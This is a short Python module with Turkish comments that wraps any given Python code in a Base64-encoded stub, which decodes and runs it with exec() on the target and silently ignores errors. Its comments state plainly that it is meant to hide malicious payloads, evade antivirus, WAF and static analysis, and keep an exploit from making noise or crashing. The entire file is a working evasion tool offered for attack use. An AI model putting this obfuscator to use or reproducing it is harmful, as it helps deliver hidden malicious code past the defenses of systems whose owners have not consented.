# Payload'ları (zararlı kod parçalarını) gizlemek ve Antivirüs/WAF atlatmak için kullanılan Base64 şifreleyici.
# Bu modül, verilen Python kodunu Base64 ile encode eder ve çalışma anında decode edip çalıştıran bir "stub" kodu üretir.

import base64

class Base64Encoder:
    """
    Basit Base64 Encoder (Şifreleyici).
    
    Bu sınıf, özellikle statik analiz araçlarını yanıltmak veya kodu okunamaz hale getirmek için kullanılır.
    Ancak Base64 tersine çevrilebilir bir işlem olduğundan güçlü bir kriptografi sağlamaz,
    sadece obfuscation (gizleme) sağlar.
    """
    
    @staticmethod
    def encode(data: str) -> str:
        """
        Verilen kaynak kodunu (string) Base64 formatına çevirir.
        Ardından bu şifreli veriyi çözecek ve çalıştıracak bir Python betiği (stub) oluşturur.

        Args:
            data (str): Şifrelenecek ham Python kodu.

        Returns:
            str: Şifrelenmiş ve çalıştırılabilir stub kodu.
        """
        # 1. Veriyi UTF-8 bayt dizisine çevir.
        # 2. Base64 ile kodla (b'...' formatında bytes döner).
        encoded_bytes = base64.b64encode(data.encode('utf-8'))
        
        # 3. Kodlanmış baytları tekrar string formatına çevir (stub içine gömmek için).
        encoded_str = encoded_bytes.decode('utf-8')
        
        # Stub (Koçbaşı) Kodu:
        # Bu kod hedef sistemde çalışacak olan kısımdır.
        # Şifreli veriyi alır, decode eder ve 'exec()' fonksiyonu ile çalıştırır.
        stub = f"""
import base64
try:
    # Base64 stringini decode et ve Python kodu olarak çalıştır.
    exec(base64.b64decode("{encoded_str}"))
except Exception as e:
    # Çalışma sırasında hata olursa sessizce geç.
    # Bu, exploit'in sistemde gürültü yapmasını veya çökmesini engeller.
    pass
"""
        return stub.strip()
